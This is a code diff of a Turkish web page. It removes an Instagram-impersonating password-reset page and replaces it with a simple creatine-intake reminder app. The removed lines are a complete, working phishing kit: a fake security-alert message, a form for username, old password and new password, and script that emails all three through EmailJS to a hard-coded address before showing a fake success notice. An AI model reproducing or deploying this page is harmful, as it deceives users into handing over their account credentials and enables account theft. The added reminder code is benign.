@@ -3,172 +3,198 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Şifre Yenileme</title>
-    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <title>Creatin Hatırlatıcı</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #fafafa;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f4f8;
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0; 
         }
         .container {
-            display: flex;
-            flex-direction: column; 
-            width: 90%;
-            max-width: 400px; /* Daha dar bir maksimum genişlik ayarladık */
-            margin: 0 auto; 
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            background-color: white;
-            overflow: hidden; /* Kenarların yuvarlatılması için */
-        }
-        .message {
-            padding: 20px;
-            border-bottom: 1px solid #dbdbdb;
-        }
-        .message h2 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 20px;
-            font-weight: bold;
-            text-align: center; /* Ortada hizalama */
-        }
-        .message p {
-            color: #555;
-            line-height: 1.5;
-            text-align: center; /* Ortada hizalama */
-        }
-        .login-container {
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 400px;
             padding: 30px;
             text-align: center;
+            position: relative; 
         }
-        .login-container h2 {
+        h1 {
+            font-size: 26px;
+            margin-bottom: 20px;
+            color: #007bff;
+        }
+        label {
+            display: block;
+            margin: 15px 0 5px;
             font-weight: bold;
             color: #333;
-            margin-bottom: 20px;
         }
         input {
-            margin: 10px 0;
-            padding: 15px;
-            width: 100%; 
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            background-color: #fafafa;
-            transition: box-shadow 0.3s ease;
+            padding: 12px;
+            margin: 5px 0;
+            width: calc(100% - 20px);
+            box-sizing: border-box;
+            border: 2px solid #007bff;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
         }
         input:focus {
+            border-color: #0056b3;
             outline: none;
-            box-shadow: 0 0 5px #3897f0;
         }
-        button {
-            padding: 15px;
-            width: 100%;
-            background-color: #3897f0;
+        .button {
+            background-color: #007bff;
             color: white;
             border: none;
-            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
             cursor: pointer;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-        }
-        button:hover {
-            background-color: #007BBF;
-            transform: scale(1.05);
-        }
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
+            font-size: 18px;
+            border-radius: 8px;
+            transition: background-color 0.3s;
             width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
         }
-        .modal-content {
-            background-color: white;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        .button:hover {
+            background-color: #0056b3;
         }
-        .close {
-            cursor: pointer;
-            color: #ff0000;
+        .status, .counter {
+            margin-top: 20px;
             font-size: 20px;
-            float: right;
+            color: #333;
+        }
+        #results {
+            margin-top: 20px;
+            font-size: 18px;
+            color: #343a40;
+            display: none; 
+        }
+        #inputFields {
+            display: none; 
+        }
+        .footer {
+            position: absolute; 
+            bottom: 10px;
+            right: 10px;
+            font-size: 14px;
+            color: #555;
+            font-style: italic; 
         }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <div class="message">
-        <h2>Hesabınız Güvende Değil!</h2>
-        <p>Güvenlik açığı nedeniyle hesabınızın riske girdiğini belirtmek isteriz. Şifrenizi güncelleyerek, hesabınızın güvenliğini sağlamak için hemen harekete geçin.</p>
-        <p>Bu mesaj, hesap güvenliğinizi sağlamak için otomatik olarak gönderilmiştir.</p>
+    <div class="container">
+        <h1>Creatin Hatırlatıcı</h1>
+        <button class="button" onclick="showInputFields()">Gün Sayısını Güncelle</button>
+        <div id="inputFields">
+            <div>
+                <label for="creatinDays">Creatin Günleri:</label>
+                <input type="number" id="creatinDays" min="1" value="">
+            </div>
+            <div>
+                <label for="restDays">Detaylar:</label> <!-- Güncellenmiş ifade -->
+                <input type="number" id="restDays" min="1" value="">
+            </div>
+            <button class="button" onclick="startCycle()">Döngüyü Başlat</button>
+        </div>
+        <p id="status" class="status">Creatin kullanım döngüsü başlatılmadı.</p>
+        <div id="results"></div>
+        <div class="footer">Designed by Conselora</div>
     </div>
 
-    <div class="login-container">
-        <h2>Güvenlik için Instagram şifrenizi güncelleyin</h2>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Kullanıcı Adı" required>
-            <input type="password" id="oldPassword" placeholder="Eski Şifre" required>
-            <input type="password" id="newPassword" placeholder="Yeni Şifre" required>
-            <button type="submit">Onayla</button>
-        </form>
-    </div>
-</div>
+    <script>
+        let kullanGunu = localStorage.getItem('kullanGunu') ? parseInt(localStorage.getItem('kullanGunu')) : null;
+        let araGunu = localStorage.getItem('araGunu') ? parseInt(localStorage.getItem('araGunu')) : null;
+        let kalanGun = localStorage.getItem('kalanGun') ? parseInt(localStorage.getItem('kalanGun')) : 0;
+        let toplamKullanilan = localStorage.getItem('toplamKullanilan') ? parseInt(localStorage.getItem('toplamKullanilan')) : 0;
+        let isCreatinGunu = localStorage.getItem('isCreatinGunu') === 'true'; 
+        let interval;
 
-<!-- Modal -->
-<div class="modal" id="warningModal">
-    <div class="modal-content">
-        <span class="close" id="closeModal">&times;</span>
-        <h2>Şifreniz başarılı bir şekilde yenilendi.</h2>
-    </div>
-</div>
-
-<script>
-    (function() {
-        emailjs.init("conselora@gmail.com"); // Buraya EmailJS kullanıcı ID'nizi girin
-    })();
-
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Formun gönderilmesini durdur
-
-        // Kullanıcı adı, eski şifre ve yeni şifreyi al
-        const username = document.getElementById('username').value;
-        const oldPassword = document.getElementById('oldPassword').value;
-        const newPassword = document.getElementById('newPassword').value;
-
-        // EmailJS ile e-posta gönderimi
-        emailjs.send("conselora@gmail.com", "template_wcsahhm", {
-            username: username,
-            oldPassword: oldPassword,
-            newPassword: newPassword
-        })
-        .then(function(response) {
-            console.log('E-posta gönderildi!', response.status, response.text);
-            const modal = document.getElementById('warningModal');
-            modal.style.display = "flex"; // Modalı görünür yap
-        }, function(error) {
-            console.log('E-posta gönderme hatası:', error);
+        document.addEventListener('DOMContentLoaded', () => {
+            if (kullanGunu && araGunu) {
+                document.getElementById('creatinDays').value = kullanGunu; 
+                document.getElementById('restDays').value = araGunu; 
+                updateDisplay();
+                if (kalanGun > 0) {
+                    startCycle(); 
+                }
+            }
         });
-    });
 
-    // Modalı kapatma
-    document.getElementById('closeModal').addEventListener('click', function() {
-        const modal = document.getElementById('warningModal');
-        modal.style.display = "none"; // Modalı gizle
-    });
-</script>
+        function showInputFields() {
+            document.getElementById('inputFields').style.display = 'block'; 
+        }
 
+        function startCycle() {
+            kullanGunu = parseInt(document.getElementById('creatinDays').value) || 40; 
+            araGunu = parseInt(document.getElementById('restDays').value) || 30; 
+
+            localStorage.setItem('kullanGunu', kullanGunu); 
+            localStorage.setItem('araGunu', araGunu); 
+            
+            kalanGun = kullanGunu;
+            toplamKullanilan = 0;
+            localStorage.setItem('kalanGun', kalanGun); 
+            localStorage.setItem('toplamKullanilan', toplamKullanilan); 
+            updateDisplay();
+            clearInterval(interval); 
+            interval = setInterval(countdown, 86400000); 
+            scheduleDailyNotification();
+            document.getElementById('inputFields').style.display = 'none'; 
+        }
+
+        function countdown() {
+            kalanGun--;
+            toplamKullanilan++;
+            localStorage.setItem('kalanGun', kalanGun); 
+            localStorage.setItem('toplamKullanilan', toplamKullanilan); 
+            
+            if (kalanGun <= 0) {
+                isCreatinGunu = !isCreatinGunu;
+                kalanGun = isCreatinGunu ? kullanGunu : araGunu;
+            }
+            localStorage.setItem('isCreatinGunu', isCreatinGunu); 
+            updateDisplay();
+        }
+
+        function updateDisplay() {
+            const status = document.getElementById('status');
+            const results = document.getElementById('results');
+
+            status.textContent = isCreatinGunu ? "Creatin Alma Günü" : "Detaylar"; // Güncellenmiş ifade
+            results.textContent = `Creatin Günleri: ${kullanGunu}, Detaylar: ${araGunu}, Toplam Kullandığınız Gün: ${toplamKullanilan}`;
+            results.style.display = "block"; 
+        }
+
+        function scheduleDailyNotification() {
+            if (Notification.permission === "granted") {
+                const now = new Date();
+                const timeUntil8PM = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 20, 0, 0, 0) - now;
+
+                setTimeout(function() {
+                    sendNotification();
+                    setInterval(sendNotification, 86400000); 
+                }, timeUntil8PM);
+            } else if (Notification.permission !== "denied") {
+                Notification.requestPermission().then(permission => {
+                    if (permission === "granted") {
+                        scheduleDailyNotification();
+                    }
+                });
+            }
+        }
+
+        function sendNotification() {
+            const message = isCreatinGunu ? "Creatin alma zamanı!" : "Bugün detayları kontrol et.";
+            new Notification("Creatin Hatırlatıcı", { body: message });
+        }
+    </script>
 </body>
 </html>
